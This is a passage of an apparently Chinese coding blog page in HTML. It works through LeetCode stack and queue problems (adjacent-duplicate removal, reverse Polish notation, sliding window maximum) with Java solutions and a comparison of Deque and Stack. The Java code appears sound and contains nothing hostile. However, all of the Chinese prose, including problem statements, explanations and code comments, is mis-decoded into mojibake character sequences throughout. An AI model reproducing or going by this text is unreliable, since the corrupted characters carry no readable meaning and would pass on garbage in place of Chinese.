class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                deque.push(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (deque.isEmpty() || deque.peek() != ch)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                deque.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deque.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1047-åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰ç›¸é‚»é‡å¤é¡¹"><a href="#1047-åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰ç›¸é‚»é‡å¤é¡¹" class="headerlink" title="1047. åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰ç›¸é‚»é‡å¤é¡¹"></a>1047. åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰ç›¸é‚»é‡å¤é¡¹</h2><p>ç»™å‡ºç”±å°å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸² sï¼Œé‡å¤é¡¹åˆ é™¤æ“ä½œä¼šé€‰æ‹©ä¸¤ä¸ªç›¸é‚»ä¸”ç›¸åŒçš„å­—æ¯ï¼Œå¹¶åˆ é™¤å®ƒä»¬ã€‚<br>åœ¨ s ä¸Šåå¤æ‰§è¡Œé‡å¤é¡¹åˆ é™¤æ“ä½œï¼Œç›´åˆ°æ— æ³•ç»§ç»­åˆ é™¤ã€‚<br>åœ¨å®Œæˆæ‰€æœ‰é‡å¤é¡¹åˆ é™¤æ“ä½œåè¿”å›æœ€ç»ˆçš„å­—ç¬¦ä¸²ã€‚ç­”æ¡ˆä¿è¯å”¯ä¸€ã€‚</p><p>è¾“å…¥ï¼šâ€abbacaâ€<br>è¾“å‡ºï¼šâ€caâ€<br>è§£é‡Šï¼š<br>ä¾‹å¦‚ï¼Œåœ¨ â€œabbacaâ€ ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ é™¤ â€œbbâ€ ç”±äºä¸¤å­—æ¯ç›¸é‚»ä¸”ç›¸åŒï¼Œè¿™æ˜¯æ­¤æ—¶å”¯ä¸€å¯ä»¥æ‰§è¡Œåˆ é™¤æ“ä½œçš„é‡å¤é¡¹ã€‚ä¹‹åæˆ‘ä»¬å¾—åˆ°å­—ç¬¦ä¸² â€œaacaâ€ï¼Œå…¶ä¸­åˆåªæœ‰ â€œaaâ€ å¯ä»¥æ‰§è¡Œé‡å¤é¡¹åˆ é™¤æ“ä½œï¼Œæ‰€ä»¥æœ€åçš„å­—ç¬¦ä¸²ä¸º â€œcaâ€ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">removeDuplicates</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">//ArrayDequeä¼šæ¯”LinkedListåœ¨é™¤äº†åˆ é™¤å…ƒç´ è¿™ä¸€ç‚¹å¤–ä¼šå¿«ä¸€ç‚¹</span></span><br><span class="line">        <span class="comment">//å‚è€ƒï¼šhttps://stackoverflow.com/questions/6163166/why-is-arraydeque-better-than-linkedlist</span></span><br><span class="line">        ArrayDeque&lt;Character&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">char</span> ch;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">            ch = s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(deque.isEmpty() || deque.peek() != ch)&#123;</span><br><span class="line">                deque.push(ch);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                deque.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty())&#123;</span><br><span class="line">            str = deque.pop() + str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="150-é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼"><a href="#150-é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼" class="headerlink" title="150. é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼"></a>150. é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼</h2><p>ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ tokens ï¼Œè¡¨ç¤ºä¸€ä¸ªæ ¹æ® é€†æ³¢å…°è¡¨ç¤ºæ³• è¡¨ç¤ºçš„ç®—æœ¯è¡¨è¾¾å¼ã€‚<br>è¯·ä½ è®¡ç®—è¯¥è¡¨è¾¾å¼ã€‚è¿”å›ä¸€ä¸ªè¡¨ç¤ºè¡¨è¾¾å¼å€¼çš„æ•´æ•°ã€‚</p><p>æ³¨æ„ï¼š<br>æœ‰æ•ˆçš„ç®—ç¬¦ä¸º â€˜+â€™ã€â€™-â€˜ã€â€™*â€™ å’Œ â€˜&#x2F;â€˜ ã€‚<br>æ¯ä¸ªæ“ä½œæ•°ï¼ˆè¿ç®—å¯¹è±¡ï¼‰éƒ½å¯ä»¥æ˜¯ä¸€ä¸ªæ•´æ•°æˆ–è€…å¦ä¸€ä¸ªè¡¨è¾¾å¼ã€‚<br>ä¸¤ä¸ªæ•´æ•°ä¹‹é—´çš„é™¤æ³•æ€»æ˜¯ å‘é›¶æˆªæ–­ ã€‚<br>è¡¨è¾¾å¼ä¸­ä¸å«é™¤é›¶è¿ç®—ã€‚<br>è¾“å…¥æ˜¯ä¸€ä¸ªæ ¹æ®é€†æ³¢å…°è¡¨ç¤ºæ³•è¡¨ç¤ºçš„ç®—æœ¯è¡¨è¾¾å¼ã€‚<br>ç­”æ¡ˆåŠæ‰€æœ‰ä¸­é—´è®¡ç®—ç»“æœå¯ä»¥ç”¨ 32 ä½ æ•´æ•°è¡¨ç¤ºã€‚</p><p>ç¤ºä¾‹ 1ï¼š<br>è¾“å…¥ï¼štokens &#x3D; [â€œ2â€,â€1â€,â€+â€,â€3â€,â€*â€]<br>è¾“å‡ºï¼š9<br>è§£é‡Šï¼šè¯¥ç®—å¼è½¬åŒ–ä¸ºå¸¸è§çš„ä¸­ç¼€ç®—æœ¯è¡¨è¾¾å¼ä¸ºï¼š((2 + 1) * 3) &#x3D; 9<br>ç¤ºä¾‹ 2ï¼š</p><p>è¾“å…¥ï¼štokens &#x3D; [â€œ4â€,â€13â€,â€5â€,â€&#x2F;â€œ,â€+â€]<br>è¾“å‡ºï¼š6<br>è§£é‡Šï¼šè¯¥ç®—å¼è½¬åŒ–ä¸ºå¸¸è§çš„ä¸­ç¼€ç®—æœ¯è¡¨è¾¾å¼ä¸ºï¼š(4 + (13 &#x2F; 5)) &#x3D; 6<br>ç¤ºä¾‹ 3ï¼š</p><p>è¾“å…¥ï¼štokens &#x3D; [â€œ10â€,â€6â€,â€9â€,â€3â€,â€+â€,â€-11â€,â€<em>â€œ,â€&#x2F;â€œ,â€</em>â€œ,â€17â€,â€+â€,â€5â€,â€+â€]<br>è¾“å‡ºï¼š22<br>è§£é‡Šï¼šè¯¥ç®—å¼è½¬åŒ–ä¸ºå¸¸è§çš„ä¸­ç¼€ç®—æœ¯è¡¨è¾¾å¼ä¸ºï¼š<br>  ((10 * (6 &#x2F; ((9 + 3) * -11))) + 17) + 5<br>&#x3D; ((10 * (6 &#x2F; (12 * -11))) + 17) + 5<br>&#x3D; ((10 * (6 &#x2F; -132)) + 17) + 5<br>&#x3D; ((10 * 0) + 17) + 5<br>&#x3D; (0 + 17) + 5<br>&#x3D; 17 + 5<br>&#x3D; 22</p><h3 id="é¢˜è§£-1"><a href="#é¢˜è§£-1" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>å…¶å®é€†æ³¢å…°è¡¨è¾¾å¼ç›¸å½“äºæ˜¯äºŒå‰æ ‘ä¸­çš„ååºéå†ã€‚ å¤§å®¶å¯ä»¥æŠŠè¿ç®—ç¬¦ä½œä¸ºä¸­é—´èŠ‚ç‚¹ï¼ŒæŒ‰ç…§ååºéå†çš„è§„åˆ™ç”»å‡ºä¸€ä¸ªäºŒå‰æ ‘ã€‚ä½†æˆ‘ä»¬æ²¡æœ‰å¿…è¦ä»äºŒå‰æ ‘çš„è§’åº¦å»è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåªè¦çŸ¥é“é€†æ³¢å…°è¡¨è¾¾å¼æ˜¯ç”¨ååºéå†çš„æ–¹å¼æŠŠäºŒå‰æ ‘åºåˆ—åŒ–äº†ï¼Œå°±å¯ä»¥äº†ã€‚<br>è¿›ä¸€æ­¥çœ‹ï¼Œæœ¬é¢˜ä¸­æ¯ä¸€ä¸ªå­è¡¨è¾¾å¼è¦å¾—å‡ºä¸€ä¸ªç»“æœï¼Œç„¶åæ‹¿è¿™ä¸ªç»“æœå†è¿›è¡Œè¿ç®—ï¼Œé‚£ä¹ˆè¿™å²‚ä¸å°±æ˜¯ä¸€ä¸ªç›¸é‚»å­—ç¬¦ä¸²æ¶ˆé™¤çš„è¿‡ç¨‹ï¼Œå’Œ1047.åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰ç›¸é‚»é‡å¤é¡¹ (opens new window)ä¸­çš„å¯¹å¯¹ç¢°æ¸¸æˆæ˜¯ä¸æ˜¯å°±éå¸¸åƒäº†ã€‚</p><p>æˆ‘ä»¬ä¹ æƒ¯çœ‹åˆ°çš„è¡¨è¾¾å¼éƒ½æ˜¯ä¸­ç¼€è¡¨è¾¾å¼ï¼Œå› ä¸ºç¬¦åˆæˆ‘ä»¬çš„ä¹ æƒ¯ï¼Œä½†æ˜¯ä¸­ç¼€è¡¨è¾¾å¼å¯¹äºè®¡ç®—æœºæ¥è¯´å°±ä¸æ˜¯å¾ˆå‹å¥½äº†ã€‚<br>ä¾‹å¦‚ï¼š4 + 13 &#x2F; 5ï¼Œè¿™å°±æ˜¯ä¸­ç¼€è¡¨è¾¾å¼ï¼Œè®¡ç®—æœºä»å·¦åˆ°å³å»æ‰«æçš„è¯ï¼Œæ‰«åˆ°13ï¼Œè¿˜è¦åˆ¤æ–­13åé¢æ˜¯ä»€ä¹ˆè¿ç®—ç¬¦ï¼Œè¿˜è¦æ¯”è¾ƒä¸€ä¸‹ä¼˜å…ˆçº§ï¼Œç„¶å13è¿˜å’Œåé¢çš„5åšè¿ç®—ï¼Œåšå®Œè¿ç®—ä¹‹åï¼Œè¿˜è¦å‘å‰å›é€€åˆ° 4 çš„ä½ç½®ï¼Œç»§ç»­åšåŠ æ³•ï¼Œä½ è¯´éº»ä¸éº»çƒ¦ï¼<br>é‚£ä¹ˆå°†ä¸­ç¼€è¡¨è¾¾å¼ï¼Œè½¬åŒ–ä¸ºåç¼€è¡¨è¾¾å¼ä¹‹åï¼š[â€œ4â€, â€œ13â€, â€œ5â€, â€œ&#x2F;â€œ, â€œ+â€] ï¼Œå°±ä¸ä¸€æ ·äº†ï¼Œè®¡ç®—æœºå¯ä»¥åˆ©ç”¨æ ˆæ¥é¡ºåºå¤„ç†ï¼Œä¸éœ€è¦è€ƒè™‘ä¼˜å…ˆçº§äº†ã€‚ä¹Ÿä¸ç”¨å›é€€äº†ï¼Œ æ‰€ä»¥åç¼€è¡¨è¾¾å¼å¯¹è®¡ç®—æœºæ¥è¯´æ˜¯éå¸¸å‹å¥½çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">evalRPN</span><span class="params">(String[] tokens)</span> &#123;</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">        <span class="keyword">for</span>(String s : tokens)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;+&quot;</span>.equals(s))&#123;<span class="comment">// leetcode å†…ç½®jdkçš„é—®é¢˜ï¼Œä¸èƒ½ä½¿ç”¨==åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰</span></span><br><span class="line">                stack.push(stack.pop() + stack.pop());</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;-&quot;</span>.equals(s))&#123;</span><br><span class="line">                stack.push(-stack.pop() + stack.pop());</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;/&quot;</span>.equals(s))&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp1</span> <span class="operator">=</span> stack.pop(); </span><br><span class="line">                <span class="type">int</span> <span class="variable">temp2</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                stack.push(temp2 / temp1);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;*&quot;</span>.equals(s))&#123;</span><br><span class="line">                stack.push(stack.pop() * stack.pop());</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                stack.push(Integer.valueOf(s));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ Java ä¸­ä½¿ç”¨ <code>Deque</code>ï¼ˆåŒç«¯é˜Ÿåˆ—ï¼‰ä»£æ›¿ä¼ ç»Ÿçš„ <code>Stack</code> ç±»æ¥å®ç°å †æ ˆæ“ä½œï¼ˆå¦‚åœ¨è§£æé€†æ³¢å…°è¡¨è¾¾å¼çš„ä¾‹å­ä¸­æ‰€ç¤ºï¼‰æœ‰å‡ ä¸ªåŸå› ï¼š</p><ol><li><strong>æ€§èƒ½æ›´ä¼˜</strong>ï¼šJava å®˜æ–¹æ–‡æ¡£æ¨èä½¿ç”¨ <code>ArrayDeque</code> ä½œä¸ºæ ˆï¼Œå› ä¸ºç›¸æ¯”äº <code>Stack</code> ç±»ï¼Œ<code>ArrayDeque</code> æœ‰æ›´å¥½çš„æ€§èƒ½ã€‚<code>Stack</code> ç»§æ‰¿è‡ª <code>Vector</code>ï¼Œåè€…æ˜¯ä¸€ä¸ªåŒæ­¥çš„é›†åˆç±»ï¼Œå› æ­¤æ¯ä¸ªæ“ä½œéƒ½æ¶‰åŠé”å®šå’Œè§£é”ï¼Œè¿™åœ¨å¤šæ•°æƒ…å†µä¸‹ä¼šå¯¼è‡´ä¸å¿…è¦çš„æ€§èƒ½å¼€é”€ã€‚è€Œ <code>ArrayDeque</code> åˆ™æ²¡æœ‰è¿™äº›é¢å¤–çš„å¼€é”€ï¼Œå› ä¸ºå®ƒä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</li><li><strong>æ›´åŠ ç°ä»£å’Œçµæ´»</strong>ï¼š<code>Stack</code> ç±»æ˜¯æ—©æœŸ Java ç‰ˆæœ¬ä¸­çš„ä¸€ä¸ªé—ç•™ç±»ï¼Œè€Œ <code>Deque</code> æ¥å£åŠå…¶å®ç°ç±»ï¼ˆå¦‚ <code>LinkedList</code> å’Œ <code>ArrayDeque</code>ï¼‰åˆ™æ˜¯ Java é›†åˆæ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼Œæä¾›äº†æ›´å¤šçš„åŠŸèƒ½å’Œçµæ´»æ€§ã€‚ä¾‹å¦‚ï¼Œ<code>Deque</code> æ”¯æŒåœ¨ä¸¤ç«¯æ’å…¥å’Œç§»é™¤å…ƒç´ ï¼Œä½¿å…¶ä¸ä»…å¯ä»¥ä½œä¸ºæ ˆä½¿ç”¨ï¼Œè¿˜å¯ä»¥ä½œä¸ºé˜Ÿåˆ—ä½¿ç”¨ã€‚</li><li><strong>æ›´å¥½çš„æ¥å£è®¾è®¡</strong>ï¼š<code>Deque</code> æ¥å£æä¾›äº†ä¸€ç»„æ›´ä¸ºä¸€è‡´å’Œå®Œæ•´çš„æ–¹æ³•æ¥æ“ä½œæ•°æ®ï¼Œè¿™ä½¿å¾—ä»£ç æ›´å®¹æ˜“ç†è§£å’Œç»´æŠ¤ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ <code>push</code>ã€<code>pop</code> å’Œ <code>peek</code> æ–¹æ³•æ¥æ¨¡æ‹Ÿä¼ ç»Ÿçš„æ ˆæ“ä½œã€‚</li></ol><h2 id="239-æ»‘åŠ¨çª—å£æœ€å¤§å€¼"><a href="#239-æ»‘åŠ¨çª—å£æœ€å¤§å€¼" class="headerlink" title="239. æ»‘åŠ¨çª—å£æœ€å¤§å€¼"></a>239. æ»‘åŠ¨çª—å£æœ€å¤§å€¼</h2><p>ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ numsï¼Œæœ‰ä¸€ä¸ªå¤§å°ä¸º k çš„æ»‘åŠ¨çª—å£ä»æ•°ç»„çš„æœ€å·¦ä¾§ç§»åŠ¨åˆ°æ•°ç»„çš„æœ€å³ä¾§ã€‚ä½ åªå¯ä»¥çœ‹åˆ°åœ¨æ»‘åŠ¨çª—å£å†…çš„ k ä¸ªæ•°å­—ã€‚æ»‘åŠ¨çª—å£æ¯æ¬¡åªå‘å³ç§»åŠ¨ä¸€ä½ã€‚<br>è¿”å› æ»‘åŠ¨çª—å£ä¸­çš„æœ€å¤§å€¼ ã€‚</p><p>ç¤ºä¾‹ 1ï¼š<br>è¾“å…¥ï¼šnums &#x3D; [1,3,-1,-3,5,3,6,7], k &#x3D; 3<br>è¾“å‡ºï¼š[3,3,5,5,6,7]<br>è§£é‡Šï¼š<br>æ»‘åŠ¨çª—å£çš„ä½ç½®                æœ€å¤§å€¼</p><hr><p>[1  3  -1] -3  5  3  6  7       3<br> 1 [3  -1  -3] 5  3  6  7       3<br> 1  3 [-1  -3  5] 3  6  7       5<br> 1  3  -1 [-3  5  3] 6  7       5<br> 1  3  -1  -3 [5  3  6] 7       6<br> 1  3  -1  -3  5 [3  6  7]      7</p><p>ç¤ºä¾‹ 2ï¼š<br>è¾“å…¥ï¼šnums &#x3D; [1], k &#x3D; 1<br>è¾“å‡ºï¼š[1]</p><h3 id="é¢˜è§£-2"><a href="#é¢˜è§£-2" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>æœ‰çš„åŒå­¦å¯èƒ½ä¼šæƒ³ç”¨ä¸€ä¸ªå¤§é¡¶å †ï¼ˆä¼˜å…ˆçº§é˜Ÿåˆ—ï¼‰æ¥å­˜æ”¾è¿™ä¸ªçª—å£é‡Œçš„kä¸ªæ•°å­—ï¼Œè¿™æ ·å°±å¯ä»¥çŸ¥é“æœ€å¤§çš„æœ€å¤§å€¼æ˜¯å¤šå°‘äº†ï¼Œ ä½†æ˜¯é—®é¢˜æ˜¯è¿™ä¸ªçª—å£æ˜¯ç§»åŠ¨çš„ï¼Œè€Œå¤§é¡¶å †æ¯æ¬¡åªèƒ½å¼¹å‡ºæœ€å¤§å€¼ï¼Œæˆ‘ä»¬æ— æ³•ç§»é™¤å…¶ä»–æ•°å€¼ï¼Œè¿™æ ·å°±é€ æˆå¤§é¡¶å †ç»´æŠ¤çš„ä¸æ˜¯æ»‘åŠ¨çª—å£é‡Œé¢çš„æ•°å€¼äº†ã€‚æ‰€ä»¥ä¸èƒ½ç”¨å¤§é¡¶å †ã€‚<br>è¿™é“é¢˜æ­£ç¡®çš„æ€è·¯æ˜¯åº”ç”¨å•è°ƒé˜Ÿåˆ—è§£å†³ï¼Œé˜Ÿåˆ—æ²¡æœ‰å¿…è¦ç»´æŠ¤çª—å£é‡Œçš„æ‰€æœ‰å…ƒç´ ï¼Œåªéœ€è¦ç»´æŠ¤æœ‰å¯èƒ½æˆä¸ºçª—å£é‡Œæœ€å¤§å€¼çš„å…ƒç´ å°±å¯ä»¥äº†ï¼ŒåŒæ—¶ä¿è¯é˜Ÿåˆ—é‡Œçš„å…ƒç´ æ•°å€¼æ˜¯ç”±å¤§åˆ°å°çš„ã€‚<br>å¯¹äºçª—å£é‡Œçš„å…ƒç´ {2, 3, 5, 1 ,4}ï¼Œå•è°ƒé˜Ÿåˆ—é‡Œåªç»´æŠ¤{5, 4} å°±å¤Ÿäº†ï¼Œä¿æŒå•è°ƒé˜Ÿåˆ—é‡Œå•è°ƒé€’å‡ï¼Œæ­¤æ—¶é˜Ÿåˆ—å‡ºå£å…ƒç´ å°±æ˜¯çª—å£é‡Œæœ€å¤§å…ƒç´ ã€‚</p><p>æ­¤æ—¶å¤§å®¶åº”è¯¥æ€€ç–‘å•è°ƒé˜Ÿåˆ—é‡Œç»´æŠ¤ç€{5, 4} æ€ä¹ˆé…åˆçª—å£è¿›è¡Œæ»‘åŠ¨å‘¢ï¼Ÿè®¾è®¡å•è°ƒé˜Ÿåˆ—çš„æ—¶å€™ï¼Œpopï¼Œå’Œpushæ“ä½œè¦ä¿æŒå¦‚ä¸‹è§„åˆ™ï¼š</p><ol><li>pop(value)ï¼šå¦‚æœçª—å£ç§»é™¤çš„å…ƒç´ valueç­‰äºå•è°ƒé˜Ÿåˆ—çš„å‡ºå£å…ƒç´ ï¼Œé‚£ä¹ˆé˜Ÿåˆ—å¼¹å‡ºå…ƒç´ ï¼Œå¦åˆ™ä¸ç”¨ä»»ä½•æ“ä½œ</li><li>push(value)ï¼šå¦‚æœpushçš„å…ƒç´ valueå¤§äºå…¥å£å…ƒç´ çš„æ•°å€¼ï¼Œé‚£ä¹ˆå°±å°†é˜Ÿåˆ—å…¥å£çš„å…ƒç´ å¼¹å‡ºï¼Œç›´åˆ°pushå…ƒç´ çš„æ•°å€¼å°äºç­‰äºé˜Ÿåˆ—å…¥å£å…ƒç´ çš„æ•°å€¼ä¸ºæ­¢</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è§£æ³•ä¸€ï¼Œè‡ªå®šä¹‰æ•°ç»„</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span>&#123;</span><br><span class="line">    Deque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// å¼¹å‡ºå…ƒç´ æ—¶ï¼Œæ¯”è¾ƒå¼¹å‡ºçš„æ•°å€¼æ˜¯å¦ç­‰äºé˜Ÿåˆ—å‡ºå£çš„æ•°å€¼ï¼Œå¦‚æœç›¸ç­‰åˆ™å¼¹å‡º</span></span><br><span class="line">        <span class="comment">// åŒæ—¶åˆ¤æ–­é˜Ÿåˆ—å½“å‰æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">poll</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!deque.isEmpty() &amp;&amp; val == deque.peek())&#123;</span><br><span class="line">            deque.poll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ·»åŠ å…ƒç´ æ—¶ï¼Œå¦‚æœè¦æ·»åŠ çš„å…ƒç´ å¤§äºå…¥å£å¤„çš„å…ƒç´ ï¼Œå°±å°†å…¥å£å…ƒç´ å¼¹å‡º</span></span><br><span class="line">    <span class="comment">//ä¿è¯é˜Ÿåˆ—å…ƒç´ å•è°ƒé€’å‡</span></span><br><span class="line">    <span class="comment">//æ¯”å¦‚æ­¤æ—¶é˜Ÿåˆ—å…ƒç´ 3,1ï¼Œ2å°†è¦å…¥é˜Ÿï¼Œæ¯”1å¤§ï¼Œæ‰€ä»¥1å¼¹å‡ºï¼Œæ­¤æ—¶é˜Ÿåˆ—ï¼š3,2</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; val &gt; deque.getLast())&#123;</span><br><span class="line">            deque.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">        deque.add(val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//é˜Ÿåˆ—é˜Ÿé¡¶å…ƒç´ å§‹ç»ˆä¸ºæœ€å¤§å€¼</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">peek</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> deque.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length - k + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// å­˜æ”¾ç»“æœå…ƒç´ çš„æ•°ç»„</span></span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// è‡ªå®šä¹‰é˜Ÿåˆ—</span></span><br><span class="line">        <span class="type">MyQueue</span> <span class="variable">myQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyQueue</span>();</span><br><span class="line">        <span class="comment">// å…ˆå°†å‰kå…ƒç´ æ”¾å…¥é˜Ÿåˆ—</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line">            myQueue.add(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        res[num++] = myQueue.peek();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="comment">// 